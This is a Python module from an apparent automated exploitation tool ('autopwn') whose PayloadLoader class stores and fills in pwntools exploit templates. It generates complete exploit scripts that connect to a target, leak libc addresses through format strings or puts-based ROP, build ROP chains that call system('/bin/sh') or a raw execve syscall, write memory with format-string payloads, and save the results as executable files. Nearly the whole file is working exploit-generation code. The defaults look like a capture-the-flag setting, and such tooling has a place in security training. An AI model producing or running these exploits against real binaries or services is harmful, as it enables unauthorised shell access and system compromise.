"""
Payload template loader and management.
"""

import os
from pathlib import Path
from typing import Dict, List, Optional

from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


# Built-in exploit templates
EXPLOIT_TEMPLATE = '''#!/usr/bin/env python3
"""
AutoPwn Generated Exploit
Target: {target_binary}
Vulnerability: {vuln_type}
Technique: {technique}
Generated: {timestamp}
"""

from pwn import *

# ========== Configuration ==========
BINARY = "./{binary_name}"
HOST = "{host}"
PORT = {port}
LIBC = "{libc_path}"

# ========== Setup ==========
context.binary = elf = ELF(BINARY)
context.log_level = "info"
{libc_setup}

def get_process():
    """Get process or remote connection."""
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript="""
            b *main
            c
        """)
    return process(elf.path)

# ========== Exploit Functions ==========
{exploit_functions}

# ========== Main ==========
def exploit():
    p = get_process()

{exploit_body}

    p.interactive()

if __name__ == "__main__":
    exploit()
'''

LEAK_TEMPLATE = '''
def leak_address(p):
    """Leak address for ASLR bypass."""
    {leak_code}
    return leaked
'''

ROP_TEMPLATE = '''
def build_rop_chain():
    """Build ROP chain."""
    rop = ROP(elf)
    {rop_code}
    return rop.chain()
'''

FORMAT_STRING_TEMPLATE = '''
def format_string_write(addr, value):
    """Write value to address using format string."""
    payload = fmtstr_payload({offset}, {{addr: value}})
    return payload
'''


class PayloadLoader:
    """
    Load and manage exploit payload templates.
    """

    def __init__(self, templates_dir: Optional[str] = None):
        """
        Initialize payload loader.

        Args:
            templates_dir: Directory containing templates
        """
        if templates_dir:
            self.templates_dir = Path(templates_dir)
        else:
            self.templates_dir = Path(__file__).parent / "templates"

        self._templates: Dict[str, str] = {}
        self._load_builtin_templates()

    def _load_builtin_templates(self) -> None:
        """Load built-in templates."""
        self._templates["exploit"] = EXPLOIT_TEMPLATE
        self._templates["leak"] = LEAK_TEMPLATE
        self._templates["rop"] = ROP_TEMPLATE
        self._templates["format_string"] = FORMAT_STRING_TEMPLATE

    def load_templates(self) -> None:
        """Load templates from directory."""
        if not self.templates_dir.exists():
            logger.debug(f"Templates directory not found: {self.templates_dir}")
            return

        for template_file in self.templates_dir.glob("*.py"):
            name = template_file.stem
            self._templates[name] = template_file.read_text()

    def get_template(self, name: str) -> Optional[str]:
        """
        Get template by name.

        Args:
            name: Template name

        Returns:
            Template string or None
        """
        return self._templates.get(name)

    def list_templates(self) -> List[str]:
        """List available templates."""
        return list(self._templates.keys())

    def render_exploit(
        self,
        target_binary: str,
        vuln_type: str,
        technique: str,
        exploit_body: str,
        host: str = "localhost",
        port: int = 1337,
        libc_path: str = "",
        exploit_functions: str = "",
    ) -> str:
        """
        Render full exploit script.

        Args:
            target_binary: Target binary path
            vuln_type: Vulnerability type
            technique: Exploitation technique
            exploit_body: Main exploit code
            host: Remote host
            port: Remote port
            libc_path: Libc path
            exploit_functions: Additional functions

        Returns:
            Complete exploit script
        """
        from datetime import datetime

        binary_name = Path(target_binary).name

        libc_setup = ""
        if libc_path:
            libc_setup = f'libc = ELF("{libc_path}")'

        return EXPLOIT_TEMPLATE.format(
            target_binary=target_binary,
            binary_name=binary_name,
            vuln_type=vuln_type,
            technique=technique,
            timestamp=datetime.now().isoformat(),
            host=host,
            port=port,
            libc_path=libc_path or "",
            libc_setup=libc_setup,
            exploit_functions=exploit_functions,
            exploit_body=exploit_body,
        )

    def render_leak_function(
        self,
        method: str,
        target: str = "libc",
    ) -> str:
        """
        Render leak function.

        Args:
            method: Leak method
            target: What to leak

        Returns:
            Function code
        """
        if method == "format_string":
            leak_code = '''
    p.sendline(b"%p." * 20)
    data = p.recvline()
    addresses = [int(x, 16) for x in data.split(b".") if x.startswith(b"0x")]
    leaked = addresses[0]  # Adjust index'''
        elif method == "puts":
            leak_code = f'''
    # Leak using puts
    payload = b"A" * offset
    payload += p64(pop_rdi)
    payload += p64(elf.got['{target}'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])  # Return to main
    p.sendline(payload)
    leaked = u64(p.recvline().strip().ljust(8, b"\\x00"))'''
        else:
            leak_code = "    # TODO: Implement leak"

        return LEAK_TEMPLATE.format(leak_code=leak_code)

    def render_rop_chain(
        self,
        chain_type: str,
        **kwargs,
    ) -> str:
        """
        Render ROP chain function.

        Args:
            chain_type: Type of chain (shell, execve, mprotect)
            **kwargs: Additional parameters

        Returns:
            Function code
        """
        if chain_type == "shell":
            rop_code = '''
    # ret2libc: system("/bin/sh")
    rop.raw(rop.find_gadget(['ret'])[0])  # Stack alignment
    rop.call('system', [next(libc.search(b'/bin/sh'))])'''
        elif chain_type == "execve":
            rop_code = '''
    # execve("/bin/sh", NULL, NULL)
    rop.raw(pop_rdi)
    rop.raw(binsh_addr)
    rop.raw(pop_rsi_r15)
    rop.raw(0)
    rop.raw(0)
    rop.raw(pop_rdx)
    rop.raw(0)
    rop.raw(pop_rax)
    rop.raw(59)
    rop.raw(syscall)'''
        elif chain_type == "mprotect":
            addr = kwargs.get("addr", 0)
            size = kwargs.get("size", 0x1000)
            rop_code = f'''
    # mprotect({hex(addr)}, {hex(size)}, 7)
    rop.call('mprotect', [{hex(addr)}, {hex(size)}, 7])'''
        else:
            rop_code = "    # TODO: Build ROP chain"

        return ROP_TEMPLATE.format(rop_code=rop_code)

    def render_format_string(
        self,
        offset: int,
        target: str = "got",
    ) -> str:
        """
        Render format string function.

        Args:
            offset: Format string offset
            target: Write target

        Returns:
            Function code
        """
        return FORMAT_STRING_TEMPLATE.format(offset=offset)

    def save_exploit(
        self,
        script: str,
        output_path: str,
        make_executable: bool = True,
    ) -> None:
        """
        Save exploit script to file.

        Args:
            script: Script content
            output_path: Output file path
            make_executable: Make file executable
        """
        path = Path(output_path)
        path.write_text(script)

        if make_executable:
            path.chmod(0o755)

        logger.info(f"Exploit saved to {output_path}")

    def summary(self) -> str:
        """Get loader summary."""
        return f"""
Payload Loader
==============
Templates loaded: {len(self._templates)}
Available: {', '.join(self._templates.keys())}
"""
